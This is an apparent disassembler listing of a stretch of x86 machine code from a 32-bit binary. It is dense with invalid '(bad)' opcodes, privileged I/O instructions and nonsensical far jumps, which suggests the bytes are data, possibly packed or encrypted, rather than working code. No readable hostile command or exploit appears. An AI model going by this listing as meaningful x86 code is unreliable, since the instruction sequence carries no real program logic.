  40a062:	movsx  ebp,BYTE PTR [edi+0x8a04e92]
  40a069:	xchg   BYTE PTR [ebp+edi*2-0x6e],cl
  40a06d:	jl     0x40a05f
  40a06f:	outs   dx,DWORD PTR ds:[esi]
  40a070:	push   ebp
  40a071:	cli    
  40a072:	stos   DWORD PTR es:[edi],eax
  40a073:	add    dl,cl
  40a075:	(bad)  
  40a077:	ins    DWORD PTR es:[edi],dx
  40a078:	scas   al,BYTE PTR es:[edi]
  40a079:	mov    dl,0x1a
  40a07b:	hlt    
  40a07c:	sub    al,0xf5
  40a07e:	int3   
  40a07f:	lods   al,BYTE PTR ds:[esi]
  40a080:	test   DWORD PTR [edi],edi
  40a082:	mov    dh,0xbe
  40a084:	sub    DWORD PTR [ecx+0x12a1371b],esp
  40a08a:	sahf   
  40a08b:	and    ebp,edi
  40a08d:	xor    BYTE PTR [ecx],bl
  40a08f:	mov    ds:0x3de224c,eax
  40a094:	in     eax,dx
  40a095:	mov    esi,0x5f572119
  40a09a:	inc    ebp
  40a09b:	jns    0x40a097
  40a09d:	xor    DWORD PTR [eax-0x6a190a8],0xdcb957db
  40a0a7:	into   
  40a0a8:	and    DWORD PTR [eax],ecx
  40a0aa:	mov    ?,edx
  40a0ac:	pop    eax
  40a0ad:	cmp    ebx,edx
  40a0af:	jp     0x40a0c4
  40a0b1:	loope  0x40a094
  40a0b3:	cwde   
  40a0b4:	test   BYTE PTR [esi+0x272f5260],dl
  40a0ba:	sbb    ebp,DWORD PTR [ebx+ebp*1]
  40a0bd:	jno    0x40a0c4
  40a0bf:	cmp    eax,0x5d4464bc
  40a0c4:	(bad)  
  40a0c5:	sbb    esp,edi
  40a0c7:	outs   dx,DWORD PTR ds:[esi]
  40a0c8:	pop    ss
  40a0c9:	loope  0x40a0fd
  40a0cb:	ds push ds
  40a0cd:	inc    edi
  40a0ce:	stos   BYTE PTR es:[edi],al
  40a0cf:	push   0x7af2a79e
  40a0d4:	or     ecx,DWORD PTR [edx]
  40a0d6:	cmp    esp,DWORD PTR [edi]
  40a0d8:	jge    0x40a073
  40a0da:	lahf   
  40a0db:	sahf   
  40a0dc:	push   esp
  40a0dd:	mov    ebp,0xf7284c17
  40a0e2:	js     0x40a0d6
  40a0e4:	jns    0x40a138
  40a0e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0e7:	dec    esi
  40a0e8:	jmp    0x5334:0x5ef5902c
  40a0ef:	hlt    
  40a0f0:	and    DWORD PTR [ebx+ecx*8-0x32],0xffffffd9
  40a0f5:	mov    al,0xa8
  40a0f7:	sbb    BYTE PTR ds:[esi],ch
  40a0fa:	mov    edx,0xcf8812ea
  40a0ff:	mov    eax,esi
  40a101:	inc    edx
  40a102:	out    0x2f,al
  40a104:	pop    eax
  40a105:	sbb    DWORD PTR [ecx+0xe92601d],esp
  40a10b:	xchg   esp,eax
  40a10c:	lock add eax,DWORD PTR [esi+ebp*2+0x6f]
  40a111:	sti    
  40a112:	jo     0x40a166
  40a114:	xor    al,0xd
  40a116:	push   0xffffffef
  40a118:	aas    
  40a119:	int    0x9
  40a11b:	xlat   BYTE PTR ds:[ebx]
  40a11c:	mov    BYTE PTR [esi],al
  40a11e:	sub    esi,DWORD PTR [ecx+0x319ac5a8]
  40a124:	inc    eax
  40a125:	in     eax,0xe3
  40a127:	mov    esi,0x6a335d78
  40a12c:	jno    0x40a15b
  40a12e:	sub    ebx,eax
  40a130:	dec    esi
  40a131:	push   ecx
  40a132:	dec    edx
  40a133:	mov    edx,0x38335a4
  40a138:	push   edi
  40a139:	dec    eax
  40a13a:	lahf   
  40a13b:	test   eax,0x9d17de17
  40a140:	add    dh,BYTE PTR [esi+ebp*1+0x627b5ee3]
  40a147:	push   esi
  40a148:	cmp    DWORD PTR [ebx+esi*2+0x41],esi
  40a14c:	imul   esi,ebp,0x974d99f7
  40a152:	ds inc ebp
  40a154:	adc    edi,eax
  40a156:	scas   eax,DWORD PTR es:[edi]
  40a157:	test   eax,0xff7be4ab
  40a15c:	pop    edi
  40a15d:	out    0x63,al
  40a15f:	int3   
  40a160:	arpl   WORD PTR [edx-0x6a5f50ef],ax
  40a166:	push   ebx
  40a167:	and    DWORD PTR [edx-0x45],esp
  40a16a:	popf   
  40a16b:	mov    ds:0x178fa4ca,eax
  40a170:	ja     0x40a1ae
  40a172:	out    0x8b,al
  40a174:	inc    BYTE PTR [eax-0x3b159d30]
  40a17a:	inc    ebp
  40a17b:	repz sbb BYTE PTR cs:[edx-0x72],0x92
  40a181:	lahf   
  40a182:	test   eax,0x1d2a0237
  40a187:	add    ch,BYTE PTR [ecx-0x72b01185]
  40a18d:	or     edi,DWORD PTR [eax]
  40a18f:	mov    ebx,0xfacc2ab6
  40a194:	push   esi
  40a195:	or     DWORD PTR [ecx+0x6f],esi
  40a198:	sub    al,0x41
  40a19a:	xchg   cl,ah
  40a19c:	out    dx,eax
  40a19d:	jno    0x40a205
  40a19f:	call   0x3ac73a2c
  40a1a4:	imul   edx,DWORD PTR [ecx-0x5707ba38],0xc5149bb8
  40a1ae:	in     al,dx
  40a1af:	xchg   edx,eax
  40a1b0:	call   0xea47a590
  40a1b5:	inc    esp
  40a1b6:	cmp    dl,cl
  40a1b8:	retf   0x2eb
  40a1bb:	mov    dl,0xf
  40a1bd:	push   esi
  40a1be:	sbb    dh,BYTE PTR [edi+ebp*8]
  40a1c1:	adc    eax,DWORD PTR [ebx]
  40a1c3:	(bad)  
  40a1c4:	(bad)  
  40a1c5:	mov    dl,0xa7
  40a1c7:	sub    DWORD PTR [ecx],0xffffffb7
  40a1ca:	adc    eax,0x29a8bc44
  40a1cf:	and    ecx,DWORD PTR [edi]
  40a1d1:	dec    ecx
  40a1d2:	fdiv   DWORD PTR [ebx+0x65907f2e]
  40a1d8:	daa    
  40a1d9:	mov    cl,0x89
  40a1db:	push   ss
  40a1dc:	lods   eax,DWORD PTR ds:[si]
  40a1de:	frstor [edx-0x54]
  40a1e1:	ror    cl,cl
  40a1e3:	cmc    
  40a1e4:	dec    esi
  40a1e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1e6:	adc    ebp,0x5e36279a
  40a1ec:	add    ch,BYTE PTR [esi+0x30]
  40a1ef:	(bad)  
  40a1f0:	sub    edi,DWORD PTR ds:0x5fdd3e41
  40a1f6:	push   ebp
  40a1f7:	nop
  40a1f8:	cmp    ebx,DWORD PTR ds:0x66b75479
  40a1fe:	call   0x1b865224
  40a203:	test   DWORD PTR [edx+eiz*2+0x716f460c],ebx
  40a20a:	push   0x12
  40a20c:	in     al,dx
  40a20d:	sub    eax,0xed5cc7b4
  40a212:	adc    al,0x60
  40a214:	xchg   edx,eax
  40a215:	loopne 0x40a237
  40a217:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40a219:	inc    ebp
  40a21a:	jle    0x40a284
  40a21c:	mov    edi,0x16da3c66
  40a221:	cld    
  40a222:	fadd   QWORD PTR [edi]
  40a224:	pop    es
  40a225:	cmp    edx,ebp
  40a227:	icebp  
  40a228:	imul   ecx,DWORD PTR [edx-0x75bb4165],0x8603cccc
  40a232:	(bad)  
  40a233:	fs mov edi,0x975e6f0d
  40a239:	and    al,0x6e
  40a23b:	scas   al,BYTE PTR es:[edi]
  40a23c:	inc    edi
  40a23d:	call   0x60e42571
  40a242:	out    0xed,eax
  40a244:	aaa    
  40a245:	lock test BYTE PTR [esi+0x31],dh
  40a249:	xor    DWORD PTR [esp+ebx*2],0x5e667701
  40a250:	xchg   esp,eax
  40a251:	sar    DWORD PTR [ecx],1
  40a253:	hlt    
  40a254:	push   ebp
  40a255:	nop
  40a256:	stc    
  40a257:	pop    esi
  40a258:	push   ecx
  40a259:	push   esp
  40a25a:	inc    ebx
  40a25b:	mov    ecx,0xf020f203
  40a260:	(bad)  
  40a261:	ss int 0xaf
  40a264:	arpl   WORD PTR es:[esp+esi*2],sp
  40a268:	sbb    eax,0x302e9e3a
  40a26d:	scas   eax,DWORD PTR es:[edi]
  40a26e:	test   ebp,edx
  40a270:	mov    cl,0x47
  40a272:	outs   dx,DWORD PTR ds:[esi]
  40a273:	stos   BYTE PTR es:[edi],al
  40a274:	and    dl,al
  40a276:	(bad)  
  40a278:	mov    bl,0xa3
  40a27a:	dec    ebx
  40a27b:	enter  0xe767,0xbc
  40a27f:	sti    
  40a280:	vpminsw ymm0,ymm5,YMMWORD PTR [ecx-0x69]
  40a285:	mov    ch,0xd7
  40a287:	je     0x40a27f
  40a289:	in     eax,0x82
  40a28b:	stos   DWORD PTR es:[edi],eax
  40a28c:	jge    0x40a2b3
  40a28e:	outs   dx,DWORD PTR ds:[esi]
  40a28f:	inc    edx
  40a290:	loopne 0x40a2de
  40a292:	in     eax,dx
  40a293:	cld    
  40a294:	push   eax
  40a295:	and    DWORD PTR [ebx-0x17],ecx
  40a298:	repz enterw 0x2997,0x89
  40a29e:	mov    WORD PTR [edi+0x2bc38d0b],?
  40a2a4:	dec    ecx
  40a2a5:	(bad)  
  40a2a6:	shl    DWORD PTR [ecx],1
  40a2a8:	or     ebx,esi
  40a2aa:	fwait
  40a2ab:	adc    edi,DWORD PTR [esi+0x469097e9]
  40a2b1:	mov    dl,0x1c
  40a2b3:	ss nop
  40a2b5:	push   edi
  40a2b6:	daa    
  40a2b7:	cli    
  40a2b8:	xor    DWORD PTR [eax-0x2f],ecx
  40a2bb:	clc    
  40a2bc:	jo     0x40a270
  40a2be:	das    
  40a2bf:	and    BYTE PTR [ebp-0xf],ch
  40a2c2:	jb     0x40a2fc
  40a2c4:	jmp    0x80c429d
  40a2c9:	ins    BYTE PTR es:[edi],dx
  40a2ca:	sbb    BYTE PTR [esi],dh
  40a2cc:	js     0x40a2de
  40a2ce:	push   edx
  40a2cf:	lock sub ah,bh
  40a2d2:	jmp    FWORD PTR [esi-0x7f946f33]
  40a2d8:	sbb    BYTE PTR [edx-0x357e58ef],bh
  40a2de:	fisttp DWORD PTR [ebx+ecx*1-0x72]
  40a2e2:	nop
  40a2e3:	iret   
  40a2e4:	add    BYTE PTR [ebx],bh
  40a2e6:	int3   
  40a2e7:	xchg   edx,eax
  40a2e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2e9:	jo     0x40a2b1
  40a2eb:	pop    edx
  40a2ec:	pop    esi
  40a2ed:	add    BYTE PTR [edi+esi*2+0x10],0x9b
  40a2f2:	add    ebx,DWORD PTR [edi]
  40a2f4:	fnstsw WORD PTR [ecx]
  40a2f6:	mov    esi,0xd6b23ad
  40a2fb:	pop    ecx
  40a2fc:	pop    ebx
  40a2fd:	scas   eax,DWORD PTR es:[edi]
  40a2fe:	js     0x40a35a
  40a300:	aam    0x9b
  40a302:	rcr    DWORD PTR [ebx+0x1d3fe4c3],cl
  40a308:	jle    0x40a2f8
  40a30a:	xor    BYTE PTR [edx+esi*8-0xf],al
  40a30e:	mov    ah,0xd5
  40a310:	shl    DWORD PTR cs:[ebp+edx*2-0x59077ea],1
  40a318:	jge    0x40a348
  40a31a:	dec    ebx
  40a31b:	cmp    al,0x50
  40a31d:	jmp    0xd20b:0xa03d900e
  40a324:	aaa    
  40a325:	icebp  
  40a326:	xor    eax,0x85ce8693
  40a32b:	sahf   
  40a32c:	xchg   edx,eax
  40a32d:	jge    0x40a377
  40a32f:	push   ds
  40a330:	ja     0x40a352
  40a332:	aas    
  40a333:	sbb    bl,BYTE PTR [ecx+0x78]
  40a336:	add    eax,0x4ec793ec
  40a33b:	or     al,al
  40a33d:	mov    al,ds:0x45ea7a94
  40a342:	mov    ch,0xaa
  40a344:	cdq    
  40a345:	jmp    DWORD PTR [esi]
  40a347:	and    al,0xd1
  40a349:	jne    0x40a308
  40a34b:	fincstp 
  40a34d:	cmp    al,0x8
  40a34f:	push   ebx
  40a350:	shl    BYTE PTR [ebx],cl
  40a352:	pop    esi
  40a353:	push   esi
  40a354:	jmp    0xe4c9cfa7
  40a359:	fwait
  40a35a:	xchg   BYTE PTR [ecx+eax*8+0x54],dh
  40a35e:	adc    eax,0xc3498b17
  40a363:	dec    edx
  40a364:	fidivr DWORD PTR [esi+0x67c347e5]
  40a36a:	ins    BYTE PTR es:[edi],dx
  40a36b:	into   
  40a36c:	(bad)  
  40a36d:	mov    dl,0x79
  40a36f:	gs pop ss
  40a371:	(bad)  
  40a373:	loop   0x40a3e2
  40a375:	aas    
  40a376:	xor    BYTE PTR [edx],bl
  40a378:	stos   DWORD PTR es:[edi],eax
  40a379:	leave  
  40a37a:	mov    WORD PTR [ecx+0x13],cs
  40a37d:	sbb    BYTE PTR [ebx+0x24],al
  40a380:	dec    esp
  40a381:	cmp    esi,DWORD PTR [edi+eiz*4]
  40a384:	inc    ebx
  40a385:	cmp    eax,0x87a61af3
  40a38a:	xchg   esp,eax
  40a38b:	pop    edi
  40a38c:	jge    0x40a338
  40a38e:	push   ebp
  40a38f:	xchg   BYTE PTR [edx],ch
  40a391:	js     0x40a387
  40a393:	jl     0x40a3a6
  40a395:	enter  0x30b2,0x6a
  40a399:	(bad)  
  40a39a:	nop
  40a39b:	shl    ah,cl
  40a39d:	outs   dx,DWORD PTR ds:[esi]
  40a39e:	inc    ebp
  40a39f:	mov    al,0xf
  40a3a1:	aaa    
  40a3a2:	cmp    dl,BYTE PTR [esi]
  40a3a4:	stc    
  40a3a5:	or     eax,0x203a004f
  40a3aa:	in     eax,0x7
  40a3ac:	push   edi
  40a3ad:	and    BYTE PTR [ecx-0xc],bh
  40a3b0:	ins    DWORD PTR es:[edi],dx
  40a3b1:	push   ebp
  40a3b2:	cld    
  40a3b3:	xor    al,0xfd
  40a3b5:	xchg   esi,eax
  40a3b6:	mov    ch,0x57
  40a3b8:	popf   
  40a3b9:	(bad)
  40a3bd:	(bad)  
  40a3be:	push   0xb9989e1
  40a3c3:	mov    BYTE PTR [ecx+0x6ff7414a],0xf0
  40a3ca:	cwde   
  40a3cb:	not    BYTE PTR [edi+0x328fea79]
  40a3d1:	sub    al,0x30
  40a3d3:	mov    ebx,0xbe715d
  40a3d8:	jo     0x40a41d
  40a3da:	push   ds
  40a3db:	mov    WORD PTR [eax+0x15],?
  40a3de:	pop    ebx
  40a3df:	into   
  40a3e0:	push   ds
  40a3e1:	xchg   dl,bh
  40a3e3:	ret    0x6928
  40a3e6:	loop   0x40a403
  40a3e8:	mov    ds:0x650557f6,al
  40a3ed:	add    BYTE PTR [eax-0x70],ah
  40a3f0:	lods   eax,DWORD PTR ds:[esi]
  40a3f1:	clc    
  40a3f2:	and    ebp,esp
  40a3f4:	aad    0x17
  40a3f6:	int3   
  40a3f7:	jmp    0x40a3c0
  40a3f9:	hlt    
  40a3fa:	dec    esi
  40a3fb:	dec    edx
  40a3fc:	imul   ebx,DWORD PTR [ebp-0x1a32784d],0x1869c863
  40a406:	ins    BYTE PTR es:[edi],dx
  40a407:	xor    eax,0x6735a7fa
  40a40c:	add    esp,eax
  40a40e:	or     DWORD PTR [ebx+0x793b8495],0x30
  40a415:	retf   0xf67a
  40a418:	lahf   
  40a419:	jp     0x40a43d
  40a41b:	mov    ah,0xa5
  40a41d:	mov    esi,0x5ff14bcc
  40a422:	(bad)  
  40a423:	cmp    ah,BYTE PTR [esi]
  40a425:	fs dec edx
  40a427:	mov    edx,0x24933d2
  40a42c:	std    
  40a42d:	js     0x40a428
  40a42f:	jle    0x40a495
  40a431:	xchg   ecx,eax
  40a432:	jl     0x40a3c4
  40a434:	dec    esi
  40a435:	jge    0x40a486
  40a437:	jne    0x40a412
  40a439:	adc    cl,ch
  40a43b:	mov    ecx,DWORD PTR [edi-0x59]
  40a43e:	sti    
  40a43f:	dec    edx
  40a440:	fild   DWORD PTR [ebp-0x23]
  40a443:	sub    DWORD PTR ds:0xef3ac5f2,esp
  40a449:	sbb    al,0xd
  40a44b:	popa   
  40a44c:	sbb    edi,ebx
  40a44e:	mov    esp,0x7fb5e63
  40a453:	aas    
  40a454:	adc    al,0xcb
  40a456:	mov    ebp,edi
  40a458:	mul    esi
  40a45a:	push   ebx
  40a45b:	xchg   ebp,eax
  40a45c:	popf   
  40a45d:	inc    esi
  40a45e:	mov    eax,ds:0x3d619f2
  40a463:	xchg   esp,eax
  40a464:	and    ah,BYTE PTR [eax]
  40a466:	xchg   esp,eax
  40a467:	nop
  40a468:	(bad)  
  40a469:	cli    
  40a46a:	mov    eax,ds:0x710ddf63
  40a46f:	and    edi,esp
  40a471:	repz mov ebp,0xef2ad840
  40a477:	scas   eax,DWORD PTR es:[edi]
  40a478:	ficomp WORD PTR [edi+0x6df9675f]
  40a47e:	sub    al,0x43
  40a480:	jg     0x40a4d9
  40a482:	in     eax,0xdc
  40a484:	sbb    eax,0xa3584e92
  40a489:	sub    cl,BYTE PTR [edx+0x66d76541]
  40a48f:	(bad)  
  40a490:	jb     0x40a4f7
  40a492:	data16 and bh,BYTE PTR [ecx]
  40a495:	loope  0x40a4e6
  40a497:	push   ss
  40a498:	inc    esp
  40a499:	pop    edx
  40a49a:	adc    dh,BYTE PTR [ebp-0x2b]
  40a49d:	xor    DWORD PTR [edi],eax
  40a49f:	or     al,0xd6
  40a4a1:	mov    DWORD PTR [ebx],eax
  40a4a3:	xor    eax,0x101957bd
  40a4a8:	ins    DWORD PTR es:[edi],dx
  40a4a9:	add    DWORD PTR [edx],edi
  40a4ab:	test   al,0x80
  40a4ad:	mov    esp,0x5051a44c
  40a4b2:	or     BYTE PTR [ecx-0x35516561],0xaf
  40a4b9:	mov    dh,0x8b
  40a4bb:	es in  eax,0x76
  40a4be:	sbb    DWORD PTR [edx],esi
  40a4c0:	bound  ebp,QWORD PTR [eax]
  40a4c2:	jno    0x40a4af
  40a4c4:	imul   edi,DWORD PTR [eax],0x523af936
  40a4ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a4cb:	int    0xd3
  40a4cd:	(bad)  
  40a4ce:	xchg   ebx,eax
  40a4cf:	pusha  
  40a4d0:	xchg   edx,eax
  40a4d1:	xor    eax,0xa9c87334
  40a4d6:	jge    0x40a47b
  40a4d8:	mov    al,0xfe
  40a4da:	ja     0x40a48d
  40a4dc:	iret   
  40a4dd:	aad    0x96
  40a4df:	dec    ecx
  40a4e0:	shl    DWORD PTR [edi],1
  40a4e2:	mov    bl,0xa9
  40a4e4:	out    dx,eax
  40a4e5:	mov    ch,0x1c
  40a4e7:	and    DWORD PTR [ebp-0x257decd6],esi
  40a4ed:	push   esi
  40a4ee:	test   eax,0x95a921a9
  40a4f3:	jl     0x40a539
  40a4f5:	and    BYTE PTR [ecx-0x18],bl
  40a4f8:	out    0x47,al
  40a4fa:	out    dx,eax
  40a4fb:	arpl   cx,ax
  40a4fd:	popa   
  40a4fe:	xchg   sp,ax
  40a500:	mov    cl,ch
  40a502:	aaa    
  40a503:	out    dx,eax
  40a504:	sbb    BYTE PTR [ebp-0x57],0x39
  40a508:	loope  0x40a585
  40a50a:	mov    edi,0x2283f300
  40a50f:	xor    eax,0x3f15b72d
  40a514:	(bad)  
  40a515:	cmp    bh,bh
  40a517:	cli    
  40a518:	out    0x1a,al
  40a51a:	push   es
  40a51b:	push   edx
  40a51c:	xchg   BYTE PTR [ebx+eax*2+0x3867893a],dl
  40a523:	cmp    esi,ebp
  40a525:	mov    ebx,0x197d5991
  40a52a:	outs   dx,BYTE PTR ds:[esi]
  40a52b:	lds    ebx,FWORD PTR [ebx+ecx*8+0x5f]
  40a52f:	jp     0x40a4e5
  40a531:	xchg   esi,eax
  40a532:	mov    ebp,0x20a0de23
  40a537:	ins    DWORD PTR es:[edi],dx
  40a538:	mov    BYTE PTR [esi+eiz*2],dh
  40a53b:	scas   eax,DWORD PTR es:[edi]
  40a53c:	pop    edi
  40a53d:	outs   dx,BYTE PTR ds:[esi]
  40a53e:	cmp    al,0x5b
  40a540:	iret   
  40a541:	xchg   edi,eax
  40a542:	mov    bl,0x3c
  40a544:	jmp    0x90ce:0x4b08b0d5
  40a54b:	int3   
  40a54c:	and    DWORD PTR ds:0xa0201e1b,0xffffffad
  40a553:	lods   eax,DWORD PTR ds:[esi]
  40a554:	inc    edi
  40a555:	(bad)  
  40a556:	mov    dh,0x76
  40a558:	or     BYTE PTR ds:[edi+0x2],dh
  40a55c:	lock sar BYTE PTR [ebp+eax*8-0x3ffd8ac8],cl
  40a564:	aaa    
  40a565:	inc    esp
  40a566:	dec    esi
  40a567:	jle    0x40a5a7
  40a569:	mov    edx,0x7e45b77b
  40a56e:	dec    esp
  40a56f:	mov    esp,0xc25110a0
  40a574:	mov    dh,0xa0
  40a576:	stos   DWORD PTR es:[edi],eax
  40a577:	rcr    DWORD PTR [eax],cl
  40a579:	out    0xaa,eax
  40a57b:	(bad)  
  40a57d:	xlat   BYTE PTR ds:[ebx]
  40a57e:	jb     0x40a595
  40a580:	xchg   ebp,eax
  40a581:	dec    ebp
  40a582:	cdq    
  40a583:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40a585:	mov    esp,0x5bafcb57
  40a58a:	xchg   BYTE PTR [ecx],bl
  40a58c:	add    al,0x31
  40a58e:	shr    BYTE PTR [eax+0x63],1
  40a591:	iret   
  40a592:	retf   
  40a593:	add    BYTE PTR [edx-0x73],cl
  40a596:	icebp  
  40a597:	retf   
  40a598:	(bad)  
  40a599:	xor    eax,0xed7a408d
  40a59e:	jecxz  0x40a56e
  40a5a0:	aad    0x99
  40a5a2:	mov    bh,0x90
  40a5a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5a5:	push   ds
  40a5a6:	fisubr WORD PTR [ebp-0x166f549e]
  40a5ac:	in     al,dx
  40a5ad:	add    eax,0x12b46a21
  40a5b2:	inc    ebp
  40a5b3:	add    cl,ah
  40a5b5:	pop    bx
  40a5b7:	shr    BYTE PTR [edi],1
  40a5b9:	shl    DWORD PTR [ebx-0x5e3b235e],0x41
  40a5c0:	sub    BYTE PTR [ecx],cl
  40a5c2:	icebp  
  40a5c3:	idiv   BYTE PTR [esi-0x73574891]
  40a5c9:	lds    esp,FWORD PTR [ecx-0x3d]
  40a5cc:	aaa    
  40a5cd:	loope  0x40a5c8
  40a5cf:	push   esp
  40a5d0:	cdq    
  40a5d1:	in     eax,dx
  40a5d2:	sahf   
  40a5d3:	adc    DWORD PTR [edi+0x670740d],edi
  40a5d9:	(bad)  
  40a5da:	mov    ecx,eax
  40a5dc:	out    0xe0,eax
  40a5de:	es mov al,gs:0xb4176fcd
  40a5e5:	repnz gs pusha 
  40a5e8:	xchg   DWORD PTR [ecx],ecx
  40a5ea:	in     eax,0xa5
  40a5ec:	xor    ebp,DWORD PTR [ecx-0x2f]
  40a5ef:	repz push eax
  40a5f1:	frstor [ecx+0x24]
  40a5f4:	rol    DWORD PTR [edx],1
  40a5f6:	fwait
  40a5f7:	rcl    BYTE PTR [edi+0x29],1
  40a5fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5fb:	or     bl,BYTE PTR [ebp+edx*1-0x4bbdd2ef]
  40a602:	enter  0x2a9e,0x7c
  40a606:	push   cs
  40a607:	aad    0x99
  40a609:	test   BYTE PTR [ebx-0x40],ch
  40a60c:	adc    ah,al
  40a60e:	cld    
  40a60f:	jns    0x40a60d
  40a611:	cmp    al,al
  40a613:	and    dl,BYTE PTR [ebp+0x44]
  40a616:	dec    ebx
  40a617:	push   esi
  40a618:	fistp  WORD PTR [ebx-0x55ad2088]
  40a61e:	loop   0x40a64e
  40a620:	xchg   BYTE PTR [ebx-0x2354b4d0],ah
  40a626:	mov    ebp,0xb7c0992b
  40a62b:	xor    al,0xc1
  40a62d:	mov    esp,0x91949154
  40a632:	xchg   DWORD PTR [edi-0x486e799f],edi
  40a638:	sbb    bl,BYTE PTR [eax-0x79]
  40a63b:	repnz push esi
  40a63d:	mov    bl,0x9e
  40a63f:	push   cs
  40a640:	rcl    ch,0x17
  40a643:	retf   0x828
  40a646:	push   ebx
  40a647:	dec    eax
  40a648:	push   ecx
  40a649:	rcl    BYTE PTR [ebp-0x61939d4e],1
  40a64f:	push   ebp
  40a650:	jmp    0x40a6c7
  40a652:	pop    ds
  40a653:	mov    gs,WORD PTR [edi+0x7a3b192f]
  40a659:	pushf  
  40a65a:	sar    BYTE PTR [ebp-0x7fb15cde],cl
  40a660:	xchg   esi,eax
  40a661:	or     ebp,edx
  40a663:	dec    ebx
  40a664:	mov    bh,0x2b
  40a666:	mov    ebp,0x30d158c1
  40a66b:	sahf   
  40a66c:	mov    ch,0x5
  40a66e:	sub    ch,BYTE PTR [eax]
  40a670:	dec    ebx
  40a671:	loop   0x40a6eb
  40a673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a674:	cmp    ebx,DWORD PTR [edx-0x7fb0011a]
  40a67a:	sbb    ch,BYTE PTR [ecx]
  40a67c:	jne    0x40a65e
  40a67e:	pop    es
  40a67f:	sbb    esp,DWORD PTR [esi]
  40a681:	out    0x59,al
  40a683:	add    eax,0x50eb112f
  40a688:	add    BYTE PTR [edx+0x22c0d9e6],bh
  40a68e:	aaa    
  40a68f:	rol    BYTE PTR [esi+0x6],1
  40a692:	das    
  40a693:	int3   
  40a694:	icebp  
  40a695:	xchg   edi,eax
  40a696:	sub    DWORD PTR [esi+ebp*2+0x75],0xffffff8b
  40a69b:	jmp    0xa998bdf
  40a6a0:	scas   al,BYTE PTR es:[edi]
  40a6a1:	jge    0x40a643
  40a6a3:	fld    DWORD PTR [edx]
  40a6a5:	pop    edi
  40a6a6:	ror    BYTE PTR [edi+0x41],0x12
  40a6aa:	inc    ecx
  40a6ab:	ins    BYTE PTR es:[edi],dx
  40a6ac:	ss (bad) 
  40a6ae:	jbe    0x40a653
  40a6b0:	jne    0x40a651
  40a6b2:	jno    0x40a6f4
  40a6b4:	outs   dx,BYTE PTR ds:[esi]
  40a6b5:	in     al,dx
  40a6b6:	in     eax,0x21
  40a6b8:	in     al,dx
  40a6b9:	push   0x6d3a567
  40a6be:	ins    BYTE PTR es:[edi],dx
  40a6bf:	lds    edx,FWORD PTR [ecx+0x38df857e]
  40a6c5:	adc    al,0x99
  40a6c7:	(bad)  
  40a6c8:	neg    DWORD PTR [ebp-0x8d0fa62]
  40a6ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6cf:	ins    DWORD PTR es:[edi],dx
  40a6d0:	dec    eax
  40a6d1:	mov    ecx,0xc3ef703a
  40a6d6:	lds    ebx,FWORD PTR [esp+edi*2]
  40a6d9:	dec    ecx
  40a6da:	outs   dx,BYTE PTR ds:[esi]
  40a6db:	mov    dl,0xf8
  40a6dd:	and    ch,dl
  40a6df:	adc    edi,esp
  40a6e1:	dec    esi
  40a6e2:	mov    eax,0x6ea55037
  40a6e7:	inc    ebx
  40a6e8:	cmp    ebx,DWORD PTR [eax+0xd763cc7]
  40a6ee:	mov    es,ebp
  40a6f0:	jl     0x40a763
  40a6f2:	jnp    0x40a685
  40a6f4:	jne    0x40a6b5
  40a6f6:	mov    ebx,0xf74359d4
  40a6fb:	in     eax,dx
  40a6fc:	test   DWORD PTR [edx+0x67],edx
  40a6ff:	cs lahf 
  40a701:	fisubr DWORD PTR [ebx+edx*1]
  40a704:	test   eax,0x6740da58
  40a709:	(bad)  
  40a70a:	stos   DWORD PTR es:[edi],eax
  40a70b:	cmc    
  40a70c:	(bad)  
  40a70d:	jb     0x40a6d5
  40a70f:	in     al,dx
  40a710:	out    0x75,eax
  40a712:	mov    DWORD PTR [ebx],esp
  40a714:	ins    DWORD PTR es:[edi],dx
  40a715:	sub    al,0xc3
  40a717:	push   ds
  40a718:	out    0x47,al
  40a71a:	dec    ecx
  40a71b:	sub    eax,0xd34a344a
  40a720:	rcr    BYTE PTR [eax+ebx*4-0x57],1
  40a724:	(bad)  
  40a726:	sub    eax,0xbfc5c7e3
  40a72b:	and    BYTE PTR [ecx-0x1cedb5cd],0x99
  40a732:	in     eax,dx
  40a733:	push   0x370ad84b
  40a738:	cmp    BYTE PTR [ecx-0x4aaf9a46],bh
  40a73e:	xlat   BYTE PTR ds:[ebx]
  40a73f:	adc    bl,cl
  40a741:	jle    0x40a76f
  40a743:	mulps  xmm6,XMMWORD PTR [edi-0x7a8fd08c]
  40a74a:	sub    eax,0xa744d4f5
  40a74f:	xor    DWORD PTR [edx],0x87ba13f6
  40a755:	adc    edi,esp
  40a757:	jnp    0x40a756
  40a759:	loop   0x40a6fc
  40a75b:	aas    
  40a75c:	popa   
  40a75d:	icebp  
  40a75e:	add    dh,BYTE PTR [eax]
  40a760:	out    dx,eax
  40a761:	adc    BYTE PTR [eax+0x25],cl
  40a764:	les    ebx,FWORD PTR [edx+esi*1+0x7cfd4c31]
  40a76b:	test   ebp,esp
  40a76d:	xchg   edx,eax
  40a76e:	and    esi,esp
  40a770:	nop
  40a771:	sbb    al,0x7
  40a773:	into   
  40a774:	cld    
  40a775:	shl    BYTE PTR [esi+0x7c],0x39
  40a779:	ficomp DWORD PTR [ecx-0x35]
  40a77c:	test   edx,0xc0d896cd
  40a782:	xchg   ecx,eax
  40a783:	cmp    BYTE PTR [ebx+0x1bd8bb74],ah
  40a789:	mov    ecx,0xe116702f
  40a78e:	cmp    esp,DWORD PTR ds:0x2db91503
  40a794:	add    al,0xc8
  40a796:	xchg   ch,bh
  40a798:	mov    ebp,0xc5c17fa6
  40a79d:	sbb    edi,edx
  40a79f:	cmp    ecx,ecx
  40a7a1:	mov    ebx,0x7f4c6e82
  40a7a6:	ss push ebx
  40a7a8:	pop    esi
  40a7a9:	popa   
  40a7aa:	push   cs
  40a7ab:	or     al,BYTE PTR [esi]
  40a7ad:	cmp    DWORD PTR [ebx-0x755aae9c],ebp
  40a7b3:	jp     0x40a7f5
